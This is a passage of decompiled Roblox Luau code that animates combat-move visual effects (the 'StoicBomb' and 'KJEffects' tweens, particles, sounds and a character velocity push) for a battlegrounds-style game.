                                                                local v2075, v2076, v2077 = pairs(_Model8:GetChildren())

                                                                while true do
                                                                    local v2078, v2079 = v2075(v2076, v2077)

                                                                    if v2078 == nil then
                                                                        break
                                                                    end

                                                                    v2077 = v2078

                                                                    if v2079:IsA('BasePart') then
                                                                        v2079.CanCollide = false
                                                                        v2079.Anchored = true
                                                                    end
                                                                end
                                                            end
                                                            if _Anchor8 then
                                                                _Model8:SetPrimaryPartCFrame(_Anchor8)
                                                            end
                                                            if u2065.T then
                                                                _Start7.Transparency = u2065.T
                                                            end

                                                            _End7.Transparency = 1
                                                            _Model8.Parent = workspace.Thrown

                                                            local _Decal13 = _Start7:FindFirstChildOfClass('Decal')
                                                            local _SpecialMesh16 = _Start7:FindFirstChildOfClass('SpecialMesh')
                                                            local _SpecialMesh17 = _End7:FindFirstChildOfClass('SpecialMesh')
                                                            local u2083 = u10

                                                            if _Del7 then
                                                                u10:Create(_Start7, u2067, {
                                                                    Size = _End7.Size,
                                                                    CFrame = _End7.CFrame,
                                                                }):Play()
                                                                task.delay(_Del7, function()
                                                                    u2083:Create(_Start7, u2067, {Transparency = u2072})
                                                                    u2083:Play()

                                                                    if _Decal13 then
                                                                        local v2084 = _Start7
                                                                        local v2085, v2086, v2087 = pairs(v2084:GetChildren())

                                                                        while true do
                                                                            local v2088

                                                                            v2087, v2088 = v2085(v2086, v2087)

                                                                            if v2087 == nil then
                                                                                break
                                                                            end
                                                                            if v2088:IsA('Decal') then
                                                                                u10:Create(v2088, u2067, {Transparency = u2072}):Play()
                                                                            end
                                                                        end
                                                                    end
                                                                    if _SpecialMesh16 then
                                                                        u2083:Create(_SpecialMesh16, u2067, {
                                                                            Scale = _SpecialMesh17.Scale,
                                                                        }):Play()
                                                                    end
                                                                end)
                                                            else
                                                                if _SpecialMesh16 then
                                                                    u10:Create(_SpecialMesh16, u2067, {
                                                                        Scale = _SpecialMesh17.Scale,
                                                                    }):Play()
                                                                end
                                                                if _Decal13 then
                                                                    local v2089, v2090, v2091 = pairs(_Start7:GetChildren())

                                                                    while true do
                                                                        local v2092

                                                                        v2091, v2092 = v2089(v2090, v2091)

                                                                        if v2091 == nil then
                                                                            break
                                                                        end
                                                                        if v2092:IsA('Decal') then
                                                                            u10:Create(v2092, u2067, {Transparency = u2072}):Play()
                                                                        end
                                                                    end

                                                                    u2083 = u2083:Create(_Start7, u2067, {
                                                                        Size = _End7.Size,
                                                                        CFrame = _End7.CFrame,
                                                                    })

                                                                    u2083:Play()
                                                                else
                                                                    u2083 = u2083:Create(_Start7, u2067, {
                                                                        Size = _End7.Size,
                                                                        Transparency = u2072,
                                                                        CFrame = _End7.CFrame,
                                                                    })

                                                                    u2083:Play()
                                                                end
                                                            end
                                                            if not _Stay7 then
                                                                if _Del7 then
                                                                    task.wait(_Del7 + 0.1)
                                                                end

                                                                u2083.Completed:Once(function()
                                                                    _Model8:Destroy()
                                                                end)
                                                            end
                                                        end
                                                    end)
                                                else
                                                    local u2093 = {
                                                        Model = v2064,
                                                        Info = TweenInfo.new(0.15, Enum.EasingStyle.Exponential),
                                                        T = 1,
                                                        EndT = 0,
                                                    }

                                                    task.spawn(function()
                                                        local _Model9 = u2093.Model
                                                        local u2095 = u2093.Info or TweenInfo.new(1, Enum.EasingStyle.Sine)
                                                        local _Start8 = _Model9:FindFirstChild('Start')
                                                        local _End8 = _Model9:FindFirstChild('End')
                                                        local _Stay8 = u2093.Stay
                                                        local _Anchor9 = u2093.Anchor
                                                        local u2100 = u2093.EndT or 1
                                                        local _Del8 = u2093.Del
                                                        local _Skip8 = u2093.Skip

                                                        if _Start8 and _End8 then
                                                            _Model9.PrimaryPart = _Start8

                                                            if not _Skip8 then
                                                                local v2103, v2104, v2105 = pairs(_Model9:GetChildren())

                                                                while true do
                                                                    local v2106, v2107 = v2103(v2104, v2105)

                                                                    if v2106 == nil then
                                                                        break
                                                                    end

                                                                    v2105 = v2106

                                                                    if v2107:IsA('BasePart') then
                                                                        v2107.CanCollide = false
                                                                        v2107.Anchored = true
                                                                    end
                                                                end
                                                            end
                                                            if _Anchor9 then
                                                                _Model9:SetPrimaryPartCFrame(_Anchor9)
                                                            end
                                                            if u2093.T then
                                                                _Start8.Transparency = u2093.T
                                                            end

                                                            _End8.Transparency = 1
                                                            _Model9.Parent = workspace.Thrown

                                                            local _Decal14 = _Start8:FindFirstChildOfClass('Decal')
                                                            local _SpecialMesh18 = _Start8:FindFirstChildOfClass('SpecialMesh')
                                                            local _SpecialMesh19 = _End8:FindFirstChildOfClass('SpecialMesh')
                                                            local u2111 = u10

                                                            if _Del8 then
                                                                u10:Create(_Start8, u2095, {
                                                                    Size = _End8.Size,
                                                                    CFrame = _End8.CFrame,
                                                                }):Play()
                                                                task.delay(_Del8, function()
                                                                    u2111:Create(_Start8, u2095, {Transparency = u2100})
                                                                    u2111:Play()

                                                                    if _Decal14 then
                                                                        local v2112 = _Start8
                                                                        local v2113, v2114, v2115 = pairs(v2112:GetChildren())

                                                                        while true do
                                                                            local v2116

                                                                            v2115, v2116 = v2113(v2114, v2115)

                                                                            if v2115 == nil then
                                                                                break
                                                                            end
                                                                            if v2116:IsA('Decal') then
                                                                                u10:Create(v2116, u2095, {Transparency = u2100}):Play()
                                                                            end
                                                                        end
                                                                    end
                                                                    if _SpecialMesh18 then
                                                                        u2111:Create(_SpecialMesh18, u2095, {
                                                                            Scale = _SpecialMesh19.Scale,
                                                                        }):Play()
                                                                    end
                                                                end)
                                                            else
                                                                if _SpecialMesh18 then
                                                                    u10:Create(_SpecialMesh18, u2095, {
                                                                        Scale = _SpecialMesh19.Scale,
                                                                    }):Play()
                                                                end
                                                                if _Decal14 then
                                                                    local v2117, v2118, v2119 = pairs(_Start8:GetChildren())

                                                                    while true do
                                                                        local v2120

                                                                        v2119, v2120 = v2117(v2118, v2119)

                                                                        if v2119 == nil then
                                                                            break
                                                                        end
                                                                        if v2120:IsA('Decal') then
                                                                            u10:Create(v2120, u2095, {Transparency = u2100}):Play()
                                                                        end
                                                                    end

                                                                    u2111 = u2111:Create(_Start8, u2095, {
                                                                        Size = _End8.Size,
                                                                        CFrame = _End8.CFrame,
                                                                    })

                                                                    u2111:Play()
                                                                else
                                                                    u2111 = u2111:Create(_Start8, u2095, {
                                                                        Size = _End8.Size,
                                                                        Transparency = u2100,
                                                                        CFrame = _End8.CFrame,
                                                                    })

                                                                    u2111:Play()
                                                                end
                                                            end
                                                            if not _Stay8 then
                                                                if _Del8 then
                                                                    task.wait(_Del8 + 0.1)
                                                                end

                                                                u2111.Completed:Once(function()
                                                                    _Model9:Destroy()
                                                                end)
                                                            end
                                                        end
                                                    end)
                                                end

                                                task.wait(0.015)
                                            end
                                        end)

                                        u1664.Main = u1664._maid:give(u1663.Main:Clone())

                                        u1664.Main:SetPrimaryPartCFrame(u1664.Impact.PrimaryPart.CFrame * CFrame.new(0, 4, 0))
                                        u246({
                                            FX = u1664.Main,
                                            Scale = 0.22499999999999998,
                                        })
                                        u413({
                                            FX = u1664.Main,
                                            Count = 5,
                                        })

                                        u1664.Main.Parent = workspace.Thrown

                                        u1664.Main:ScaleTo(2.1)
                                        u439(u1664.Main)

                                        u1664.Ray = u1664._maid:give(u1663.Ray:Clone())

                                        u1664.Ray:SetPrimaryPartCFrame(u1664.Impact.PrimaryPart.CFrame * CFrame.new(0, 0, 0))
                                        u246({
                                            FX = u1664.Ray,
                                            Scale = 0.405,
                                        })
                                        u413({
                                            FX = u1664.Ray,
                                            Count = 5,
                                        })

                                        u1664.Ray.Parent = workspace.Thrown

                                        u1664.Ray:ScaleTo(4.2)
                                        u439(u1664.Ray)
                                    end,
                                    [208] = function()
                                        local v2121, v2122, v2123 = pairs(u1664.StoicBombSpeedLines:GetDescendants())

                                        while true do
                                            local v2124

                                            v2123, v2124 = v2121(v2122, v2123)

                                            if v2123 == nil then
                                                break
                                            end
                                            if v2124:IsA('ParticleEmitter') then
                                                v2124.Enabled = false
                                            end
                                        end

                                        local v2125, v2126, v2127 = pairs(u1664.Ranges)

                                        while true do
                                            local v2128

                                            v2127, v2128 = v2125(v2126, v2127)

                                            if v2127 == nil then
                                                break
                                            end

                                            u10:Create(v2127, TweenInfo.new(0.3, Enum.EasingStyle.Sine), {Range = 0}):Play()
                                        end
                                    end,
                                    [79] = function()
                                        u446({
                                            orig = _char.Torso.Position,
                                            dir = Vector3.new(0, -200, 0, 0),
                                        })

                                        local v2129 = {
                                            Position = _char.PrimaryPart.Position - Vector3.new(0, 2.4000000953674316, 0, 0),
                                        }

                                        if v2129 then
                                            u1664.StoicBoomEntrance = u1664._maid:give(u1663['stoic bomb boom entrance']:Clone())
                                            u1664.StoicBoomEntrance.Position = v2129.Position + Vector3.new(0, -0.5, 0, 0)
                                            u1664.StoicBoomEntrance.Parent = workspace.Thrown

                                            u439(u1664.StoicBoomEntrance.smok)
                                            u439(u1664.StoicBoomEntrance.Attachment)
                                            u1664.StoicBoomEntrance['BOMB.TWO.']:Emit(u1664.StoicBoomEntrance['BOMB.TWO.']:GetAttribute('EmitCount'))

                                            for v2130 = 1, 3 do
                                                local v2131 = u1663.Outty:Clone()

                                                v2131:SetPrimaryPartCFrame(u1664.StoicBoomEntrance.CFrame * CFrame.new(0, 4 * v2130, 0))
                                                v2131:ScaleTo(0.5 * v2130)

                                                local u2132 = {
                                                    Model = v2131,
                                                    Info = TweenInfo.new(3, Enum.EasingStyle.Exponential),
                                                    T = 0.8,
                                                }

                                                task.spawn(function()
                                                    local _Model10 = u2132.Model
                                                    local u2134 = u2132.Info or TweenInfo.new(1, Enum.EasingStyle.Sine)
                                                    local _Start9 = _Model10:FindFirstChild('Start')
                                                    local _End9 = _Model10:FindFirstChild('End')
                                                    local _Stay9 = u2132.Stay
                                                    local _Anchor10 = u2132.Anchor
                                                    local u2139 = u2132.EndT or 1
                                                    local _Del9 = u2132.Del
                                                    local _Skip9 = u2132.Skip

                                                    if _Start9 and _End9 then
                                                        _Model10.PrimaryPart = _Start9

                                                        if not _Skip9 then
                                                            local v2142, v2143, v2144 = pairs(_Model10:GetChildren())

                                                            while true do
                                                                local v2145, v2146 = v2142(v2143, v2144)

                                                                if v2145 == nil then
                                                                    break
                                                                end

                                                                v2144 = v2145

                                                                if v2146:IsA('BasePart') then
                                                                    v2146.CanCollide = false
                                                                    v2146.Anchored = true
                                                                end
                                                            end
                                                        end
                                                        if _Anchor10 then
                                                            _Model10:SetPrimaryPartCFrame(_Anchor10)
                                                        end
                                                        if u2132.T then
                                                            _Start9.Transparency = u2132.T
                                                        end

                                                        _End9.Transparency = 1
                                                        _Model10.Parent = workspace.Thrown

                                                        local _Decal15 = _Start9:FindFirstChildOfClass('Decal')
                                                        local _SpecialMesh20 = _Start9:FindFirstChildOfClass('SpecialMesh')
                                                        local _SpecialMesh21 = _End9:FindFirstChildOfClass('SpecialMesh')
                                                        local u2150 = u10

                                                        if _Del9 then
                                                            u10:Create(_Start9, u2134, {
                                                                Size = _End9.Size,
                                                                CFrame = _End9.CFrame,
                                                            }):Play()
                                                            task.delay(_Del9, function()
                                                                u2150:Create(_Start9, u2134, {Transparency = u2139})
                                                                u2150:Play()

                                                                if _Decal15 then
                                                                    local v2151 = _Start9
                                                                    local v2152, v2153, v2154 = pairs(v2151:GetChildren())

                                                                    while true do
                                                                        local v2155

                                                                        v2154, v2155 = v2152(v2153, v2154)

                                                                        if v2154 == nil then
                                                                            break
                                                                        end
                                                                        if v2155:IsA('Decal') then
                                                                            u10:Create(v2155, u2134, {Transparency = u2139}):Play()
                                                                        end
                                                                    end
                                                                end
                                                                if _SpecialMesh20 then
                                                                    u2150:Create(_SpecialMesh20, u2134, {
                                                                        Scale = _SpecialMesh21.Scale,
                                                                    }):Play()
                                                                end
                                                            end)
                                                        else
                                                            if _SpecialMesh20 then
                                                                u10:Create(_SpecialMesh20, u2134, {
                                                                    Scale = _SpecialMesh21.Scale,
                                                                }):Play()
                                                            end
                                                            if _Decal15 then
                                                                local v2156, v2157, v2158 = pairs(_Start9:GetChildren())

                                                                while true do
                                                                    local v2159

                                                                    v2158, v2159 = v2156(v2157, v2158)

                                                                    if v2158 == nil then
                                                                        break
                                                                    end
                                                                    if v2159:IsA('Decal') then
                                                                        u10:Create(v2159, u2134, {Transparency = u2139}):Play()
                                                                    end
                                                                end

                                                                u2150:Create(_Start9, u2134, {
                                                                    Size = _End9.Size,
                                                                    CFrame = _End9.CFrame,
                                                                })
                                                                u2150:Play()
                                                            else
                                                                u2150 = u2150:Create(_Start9, u2134, {
                                                                    Size = _End9.Size,
                                                                    Transparency = u2139,
                                                                    CFrame = _End9.CFrame,
                                                                })

                                                                u2150:Play()
                                                            end
                                                        end
                                                        if not _Stay9 then
                                                            if _Del9 then
                                                                task.wait(_Del9 + 0.1)
                                                            end

                                                            u2150.Completed:Once(function()
                                                                _Model10:Destroy()
                                                            end)
                                                        end
                                                    end
                                                end)
                                            end

                                            task.wait(0.1)

                                            local v2160 = u1663.Outty:Clone()

                                            v2160:SetPrimaryPartCFrame(u1664.StoicBoomEntrance.CFrame * CFrame.new(0, 3, 0) * CFrame.Angles(3.141592653589793, 0, 0))
                                            v2160:ScaleTo(3)

                                            local u2161 = {
                                                Model = v2160,
                                                Info = TweenInfo.new(2, Enum.EasingStyle.Exponential),
                                                T = 0.8,
                                            }

                                            task.spawn(function()
                                                local _Model11 = u2161.Model
                                                local u2163 = u2161.Info or TweenInfo.new(1, Enum.EasingStyle.Sine)
                                                local _Start10 = _Model11:FindFirstChild('Start')
                                                local _End10 = _Model11:FindFirstChild('End')
                                                local _Stay10 = u2161.Stay
                                                local _Anchor11 = u2161.Anchor
                                                local u2168 = u2161.EndT or 1
                                                local _Del10 = u2161.Del
                                                local _Skip10 = u2161.Skip

                                                if _Start10 and _End10 then
                                                    _Model11.PrimaryPart = _Start10

                                                    if not _Skip10 then
                                                        local v2171, v2172, v2173 = pairs(_Model11:GetChildren())

                                                        while true do
                                                            local v2174, v2175 = v2171(v2172, v2173)

                                                            if v2174 == nil then
                                                                break
                                                            end

                                                            v2173 = v2174

                                                            if v2175:IsA('BasePart') then
                                                                v2175.CanCollide = false
                                                                v2175.Anchored = true
                                                            end
                                                        end
                                                    end
                                                    if _Anchor11 then
                                                        _Model11:SetPrimaryPartCFrame(_Anchor11)
                                                    end
                                                    if u2161.T then
                                                        _Start10.Transparency = u2161.T
                                                    end

                                                    _End10.Transparency = 1
                                                    _Model11.Parent = workspace.Thrown

                                                    local _Decal16 = _Start10:FindFirstChildOfClass('Decal')
                                                    local _SpecialMesh22 = _Start10:FindFirstChildOfClass('SpecialMesh')
                                                    local _SpecialMesh23 = _End10:FindFirstChildOfClass('SpecialMesh')
                                                    local u2179 = u10

                                                    if _Del10 then
                                                        u10:Create(_Start10, u2163, {
                                                            Size = _End10.Size,
                                                            CFrame = _End10.CFrame,
                                                        }):Play()
                                                        task.delay(_Del10, function()
                                                            u2179:Create(_Start10, u2163, {Transparency = u2168})
                                                            u2179:Play()

                                                            if _Decal16 then
                                                                local v2180 = _Start10
                                                                local v2181, v2182, v2183 = pairs(v2180:GetChildren())

                                                                while true do
                                                                    local v2184

                                                                    v2183, v2184 = v2181(v2182, v2183)

                                                                    if v2183 == nil then
                                                                        break
                                                                    end
                                                                    if v2184:IsA('Decal') then
                                                                        u10:Create(v2184, u2163, {Transparency = u2168}):Play()
                                                                    end
                                                                end
                                                            end
                                                            if _SpecialMesh22 then
                                                                u2179:Create(_SpecialMesh22, u2163, {
                                                                    Scale = _SpecialMesh23.Scale,
                                                                }):Play()
                                                            end
                                                        end)
                                                    else
                                                        if _SpecialMesh22 then
                                                            u10:Create(_SpecialMesh22, u2163, {
                                                                Scale = _SpecialMesh23.Scale,
                                                            }):Play()
                                                        end
                                                        if _Decal16 then
                                                            local v2185, v2186, v2187 = pairs(_Start10:GetChildren())

                                                            while true do
                                                                local v2188

                                                                v2187, v2188 = v2185(v2186, v2187)

                                                                if v2187 == nil then
                                                                    break
                                                                end
                                                                if v2188:IsA('Decal') then
                                                                    u10:Create(v2188, u2163, {Transparency = u2168}):Play()
                                                                end
                                                            end

                                                            u2179:Create(_Start10, u2163, {
                                                                Size = _End10.Size,
                                                                CFrame = _End10.CFrame,
                                                            })
                                                            u2179:Play()
                                                        else
                                                            u2179 = u2179:Create(_Start10, u2163, {
                                                                Size = _End10.Size,
                                                                Transparency = u2168,
                                                                CFrame = _End10.CFrame,
                                                            })

                                                            u2179:Play()
                                                        end
                                                    end
                                                    if not _Stay10 then
                                                        if _Del10 then
                                                            task.wait(_Del10 + 0.1)
                                                        end

                                                        u2179.Completed:Once(function()
                                                            _Model11:Destroy()
                                                        end)
                                                    end
                                                end
                                            end)
                                            task.spawn(function()
                                                while not u1664.Impact do
                                                    local v2189 = u1663.WindTime:Clone()

                                                    v2189:ScaleTo(u335(1, 2))

                                                    local v2190 = {
                                                        Model = v2189,
                                                        T = 0.9,
                                                    }
                                                    local _CFrame14 = _PrimaryPart5.CFrame
                                                    local _Angles11 = CFrame.Angles
                                                    local v2193 = -15
                                                    local v2194 = 15
                                                    local v2195 = u329
                                                    local v2196

                                                    if v2194 or not v2193 then
                                                        v2196 = v2193
                                                        v2193 = v2194
                                                    else
                                                        v2196 = 1
                                                    end
                                                    if not (v2193 or v2196) then
                                                        v2196 = 0
                                                        v2193 = 1
                                                    end

                                                    local v2197 = math.rad((v2195:NextNumber(v2196, v2193)))
                                                    local v2198 = 0
                                                    local v2199 = 360
                                                    local v2200 = u329
                                                    local v2201

                                                    if v2199 or not v2198 then
                                                        v2201 = v2198
                                                        v2198 = v2199
                                                    else
                                                        v2201 = 1
                                                    end
                                                    if not (v2198 or v2201) then
                                                        v2201 = 0
                                                        v2198 = 1
                                                    end

                                                    local v2202 = math.rad((v2200:NextNumber(v2201, v2198)))
                                                    local v2203 = -15
                                                    local v2204 = 15
                                                    local v2205 = u329
                                                    local v2206

                                                    if v2204 or not v2203 then
                                                        v2206 = v2203
                                                        v2203 = v2204
                                                    else
                                                        v2206 = 1
                                                    end
                                                    if not (v2203 or v2206) then
                                                        v2206 = 0
                                                        v2203 = 1
                                                    end

                                                    v2190.Anchor = _CFrame14 * _Angles11(v2197, v2202, (math.rad((v2205:NextNumber(v2206, v2203)))))

                                                    local _new9 = TweenInfo.new
                                                    local v2208 = 0.2
                                                    local v2209 = 0.3
                                                    local v2210 = u329
                                                    local v2211

                                                    if v2209 or not v2208 then
                                                        v2211 = v2208
                                                        v2208 = v2209
                                                    else
                                                        v2211 = 1
                                                    end
                                                    if not (v2208 or v2211) then
                                                        v2211 = 0
                                                        v2208 = 1
                                                    end

                                                    v2190.Info = _new9(v2210:NextNumber(v2211, v2208), Enum.EasingStyle.Sine)

                                                    local u2212 = v2190

                                                    task.spawn(function()
                                                        local _Model12 = u2212.Model
                                                        local u2214 = u2212.Info or TweenInfo.new(1, Enum.EasingStyle.Sine)
                                                        local _Start11 = _Model12:FindFirstChild('Start')
                                                        local _End11 = _Model12:FindFirstChild('End')
                                                        local _Stay11 = u2212.Stay
                                                        local _Anchor12 = u2212.Anchor
                                                        local u2219 = u2212.EndT or 1
                                                        local _Del11 = u2212.Del
                                                        local _Skip11 = u2212.Skip

                                                        if _Start11 and _End11 then
                                                            _Model12.PrimaryPart = _Start11

                                                            if not _Skip11 then
                                                                local v2222, v2223, v2224 = pairs(_Model12:GetChildren())

                                                                while true do
                                                                    local v2225, v2226 = v2222(v2223, v2224)

                                                                    if v2225 == nil then
                                                                        break
                                                                    end

                                                                    v2224 = v2225

                                                                    if v2226:IsA('BasePart') then
                                                                        v2226.CanCollide = false
                                                                        v2226.Anchored = true
                                                                    end
                                                                end
                                                            end
                                                            if _Anchor12 then
                                                                _Model12:SetPrimaryPartCFrame(_Anchor12)
                                                            end
                                                            if u2212.T then
                                                                _Start11.Transparency = u2212.T
                                                            end

                                                            _End11.Transparency = 1
                                                            _Model12.Parent = workspace.Thrown

                                                            local _Decal17 = _Start11:FindFirstChildOfClass('Decal')
                                                            local _SpecialMesh24 = _Start11:FindFirstChildOfClass('SpecialMesh')
                                                            local _SpecialMesh25 = _End11:FindFirstChildOfClass('SpecialMesh')
                                                            local u2230 = u10

                                                            if _Del11 then
                                                                u10:Create(_Start11, u2214, {
                                                                    Size = _End11.Size,
                                                                    CFrame = _End11.CFrame,
                                                                }):Play()
                                                                task.delay(_Del11, function()
                                                                    u2230:Create(_Start11, u2214, {Transparency = u2219})
                                                                    u2230:Play()

                                                                    if _Decal17 then
                                                                        local v2231 = _Start11
                                                                        local v2232, v2233, v2234 = pairs(v2231:GetChildren())

                                                                        while true do
                                                                            local v2235

                                                                            v2234, v2235 = v2232(v2233, v2234)

                                                                            if v2234 == nil then
                                                                                break
                                                                            end
                                                                            if v2235:IsA('Decal') then
                                                                                u10:Create(v2235, u2214, {Transparency = u2219}):Play()
                                                                            end
                                                                        end
                                                                    end
                                                                    if _SpecialMesh24 then
                                                                        u2230:Create(_SpecialMesh24, u2214, {
                                                                            Scale = _SpecialMesh25.Scale,
                                                                        }):Play()
                                                                    end
                                                                end)
                                                            else
                                                                if _SpecialMesh24 then
                                                                    u10:Create(_SpecialMesh24, u2214, {
                                                                        Scale = _SpecialMesh25.Scale,
                                                                    }):Play()
                                                                end
                                                                if _Decal17 then
                                                                    local v2236, v2237, v2238 = pairs(_Start11:GetChildren())

                                                                    while true do
                                                                        local v2239

                                                                        v2238, v2239 = v2236(v2237, v2238)

                                                                        if v2238 == nil then
                                                                            break
                                                                        end
                                                                        if v2239:IsA('Decal') then
                                                                            u10:Create(v2239, u2214, {Transparency = u2219}):Play()
                                                                        end
                                                                    end

                                                                    u2230 = u2230:Create(_Start11, u2214, {
                                                                        Size = _End11.Size,
                                                                        CFrame = _End11.CFrame,
                                                                    })

                                                                    u2230:Play()
                                                                else
                                                                    u2230 = u2230:Create(_Start11, u2214, {
                                                                        Size = _End11.Size,
                                                                        Transparency = u2219,
                                                                        CFrame = _End11.CFrame,
                                                                    })

                                                                    u2230:Play()
                                                                end
                                                            end
                                                            if not _Stay11 then
                                                                if _Del11 then
                                                                    task.wait(_Del11 + 0.1)
                                                                end

                                                                u2230.Completed:Once(function()
                                                                    _Model12:Destroy()
                                                                end)
                                                            end
                                                        end
                                                    end)

                                                    local v2240 = u1663.InWind:Clone()
                                                    local _, v2241, _ = _char.HumanoidRootPart.CFrame:ToOrientation()

                                                    v2240:SetPrimaryPartCFrame(CFrame.new(_char.Torso.Position) * CFrame.Angles(0, v2241, 0) * CFrame.Angles(math.rad((math.random(-15, 15))), math.rad((math.random(0, 360))), (math.rad((math.random(-15, 15))))))
                                                    v2240:ScaleTo(u335(0.6, 1))

                                                    local u2242 = {Model = v2240}
                                                    local _new10 = TweenInfo.new
                                                    local v2244 = 0.7
                                                    local v2245 = 1.5
                                                    local v2246 = u329
                                                    local v2247

                                                    if v2245 or not v2244 then
                                                        v2247 = v2244
                                                        v2244 = v2245
                                                    else
                                                        v2247 = 1
                                                    end
                                                    if not (v2244 or v2247) then
                                                        v2247 = 0
                                                        v2244 = 1
                                                    end

                                                    u2242.Info = _new10(v2246:NextNumber(v2247, v2244), Enum.EasingStyle.Exponential)
                                                    u2242.T = 0.9

                                                    task.spawn(function()
                                                        local _Model13 = u2242.Model
                                                        local u2249 = u2242.Info or TweenInfo.new(1, Enum.EasingStyle.Sine)
                                                        local _Start12 = _Model13:FindFirstChild('Start')
                                                        local _End12 = _Model13:FindFirstChild('End')
                                                        local _Stay12 = u2242.Stay
                                                        local _Anchor13 = u2242.Anchor
                                                        local u2254 = u2242.EndT or 1
                                                        local _Del12 = u2242.Del
                                                        local _Skip12 = u2242.Skip

                                                        if _Start12 and _End12 then
                                                            _Model13.PrimaryPart = _Start12

                                                            if not _Skip12 then
                                                                local v2257, v2258, v2259 = pairs(_Model13:GetChildren())

                                                                while true do
                                                                    local v2260, v2261 = v2257(v2258, v2259)

                                                                    if v2260 == nil then
                                                                        break
                                                                    end

                                                                    v2259 = v2260

                                                                    if v2261:IsA('BasePart') then
                                                                        v2261.CanCollide = false
                                                                        v2261.Anchored = true
                                                                    end
                                                                end
                                                            end
                                                            if _Anchor13 then
                                                                _Model13:SetPrimaryPartCFrame(_Anchor13)
                                                            end
                                                            if u2242.T then
                                                                _Start12.Transparency = u2242.T
                                                            end

                                                            _End12.Transparency = 1
                                                            _Model13.Parent = workspace.Thrown

                                                            local _Decal18 = _Start12:FindFirstChildOfClass('Decal')
                                                            local _SpecialMesh26 = _Start12:FindFirstChildOfClass('SpecialMesh')
                                                            local _SpecialMesh27 = _End12:FindFirstChildOfClass('SpecialMesh')
                                                            local u2265 = u10

                                                            if _Del12 then
                                                                u10:Create(_Start12, u2249, {
                                                                    Size = _End12.Size,
                                                                    CFrame = _End12.CFrame,
                                                                }):Play()
                                                                task.delay(_Del12, function()
                                                                    u2265:Create(_Start12, u2249, {Transparency = u2254})
                                                                    u2265:Play()

                                                                    if _Decal18 then
                                                                        local v2266 = _Start12
                                                                        local v2267, v2268, v2269 = pairs(v2266:GetChildren())

                                                                        while true do
                                                                            local v2270

                                                                            v2269, v2270 = v2267(v2268, v2269)

                                                                            if v2269 == nil then
                                                                                break
                                                                            end
                                                                            if v2270:IsA('Decal') then
                                                                                u10:Create(v2270, u2249, {Transparency = u2254}):Play()
                                                                            end
                                                                        end
                                                                    end
                                                                    if _SpecialMesh26 then
                                                                        u2265:Create(_SpecialMesh26, u2249, {
                                                                            Scale = _SpecialMesh27.Scale,
                                                                        }):Play()
                                                                    end
                                                                end)
                                                            else
                                                                if _SpecialMesh26 then
                                                                    u10:Create(_SpecialMesh26, u2249, {
                                                                        Scale = _SpecialMesh27.Scale,
                                                                    }):Play()
                                                                end
                                                                if _Decal18 then
                                                                    local v2271, v2272, v2273 = pairs(_Start12:GetChildren())

                                                                    while true do
                                                                        local v2274

                                                                        v2273, v2274 = v2271(v2272, v2273)

                                                                        if v2273 == nil then
                                                                            break
                                                                        end
                                                                        if v2274:IsA('Decal') then
                                                                            u10:Create(v2274, u2249, {Transparency = u2254}):Play()
                                                                        end
                                                                    end

                                                                    u2265 = u2265:Create(_Start12, u2249, {
                                                                        Size = _End12.Size,
                                                                        CFrame = _End12.CFrame,
                                                                    })

                                                                    u2265:Play()
                                                                else
                                                                    u2265 = u2265:Create(_Start12, u2249, {
                                                                        Size = _End12.Size,
                                                                        Transparency = u2254,
                                                                        CFrame = _End12.CFrame,
                                                                    })

                                                                    u2265:Play()
                                                                end
                                                            end
                                                            if not _Stay12 then
                                                                if _Del12 then
                                                                    task.wait(_Del12 + 0.1)
                                                                end

                                                                u2265.Completed:Once(function()
                                                                    _Model13:Destroy()
                                                                end)
                                                            end
                                                        end
                                                    end)
                                                    task.wait(0.2)
                                                end
                                            end)
                                        end
                                    end,
                                }

                                (function()
                                    local u2276 = 0
                                    local u2277 = nil
                                    local _Frames = game.ReplicatedStorage.Resources.StoicBomb.StoicBomb2.Frames
                                    local _ = workspace.CurrentCamera

                                    tick()

                                    local _ = _char.PrimaryPart

                                    _Frames.Parent:FindFirstChild('FOV')

                                    local _ = u12.Heartbeat:Connect(function(p2279)
                                        u2276 = u2276 + p2279 * 60

                                        local v2280 = _Frames:FindFirstChild((tonumber((math.ceil(u2276)))))

                                        if v2280 then
                                            tonumber(v2280.Name)

                                            local v2281, v2282, v2283 = pairs(u2275)

                                            while true do
                                                local v2284

                                                v2283, v2284 = v2281(v2282, v2283)

                                                if v2283 == nil then
                                                    break
                                                end
                                                if v2283 <= u2276 and not u1665[v2283] then
                                                    u1665[v2283] = true

                                                    v2284()
                                                end
                                            end
                                        else
                                            u140()
                                            u149()
                                            u131()
                                            u2277:Disconnect()
                                        end
                                    end)
                                end)()
                            else
                                local _Animation6 = Instance.new('Animation')

                                _Animation6.AnimationId = 'rbxassetid://18169288949'

                                _char.Humanoid:LoadAnimation(_Animation6):Play()
                            end
                        end
                        local function u2299()
                            u251()
                            u116()
                            u706('rbxassetid://18445236460', true).Stopped:Connect(u131)
                            task.delay(1.9, function()
                                local v2287 = u4.Resources.KJEffects['fine...Emit']:Clone()

                                v2287.CFrame = _LocalPlayer3.Character.HumanoidRootPart.CFrame * CFrame.new(0, -0.5, 0)
                                v2287.Anchored = true
                                v2287.Parent = workspace.Thrown

                                local v2288, v2289, v2290 = pairs(v2287:GetDescendants())

                                while true do
                                    local v2291

                                    v2290, v2291 = v2288(v2289, v2290)

                                    if v2290 == nil then
                                        break
                                    end
                                    if v2291:IsA('ParticleEmitter') then
                                        task.wait()
                                        v2291:Emit(v2291:GetAttribute('EmitCount'))
                                    end
                                end
                            end)

                            local _BodyVelocity7 = Instance.new('BodyVelocity')

                            _BodyVelocity7.MaxForce = Vector3.new(90000, 0, 90000)
                            _BodyVelocity7.Velocity = Vector3.new(0, 0, 0)
                            _BodyVelocity7.Parent = _LocalPlayer3.Character.HumanoidRootPart

                            local u2293 = 7
                            local u2294 = u12.RenderStepped:Connect(function()
                                pcall(function()
                                    _BodyVelocity7.Velocity = _LocalPlayer3.Character.HumanoidRootPart.CFrame.lookVector * Vector3.new(1, 0, 1) * u2293
                                end)
                            end)

                            task.delay(2, function()
                                u2294:Disconnect()
                                _BodyVelocity7:Destroy()
                            end)

                            local _Sound13 = Instance.new('Sound')

                            _Sound13.Volume = 2
                            _Sound13.Parent = _LocalPlayer3.Character.Torso
                            _Sound13.SoundId = 'rbxassetid://18445228136'

                            _Sound13:Play()

                            local _Sound14 = Instance.new('Sound')

                            _Sound14.Volume = 4
                            _Sound14.Parent = _LocalPlayer3.Character.Torso
                            _Sound14.SoundId = 'rbxassetid://18445285190'

                            _Sound14:Play()

                            local _Sound15 = Instance.new('Sound')

                            _Sound15.Volume = 6
